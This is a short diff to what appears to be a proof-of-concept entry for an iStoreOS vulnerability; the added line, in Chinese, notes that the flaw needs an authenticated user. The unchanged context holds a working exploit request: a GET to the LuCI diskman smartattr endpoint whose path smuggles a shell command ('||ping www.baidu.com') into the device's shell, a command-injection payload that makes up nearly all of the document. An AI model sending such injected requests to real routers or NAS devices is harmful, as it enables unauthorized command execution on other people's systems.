@@ -2,6 +2,7 @@
 title:"IstoreOS"
 
 ## poc
+需有权限才能使用此漏洞
 ```C
 GET /cgi-bin/luci/admin/system/diskman/smartattr/%7c%7cping%20www.baidu.com HTTP/1.1
 Host: IP:PORT
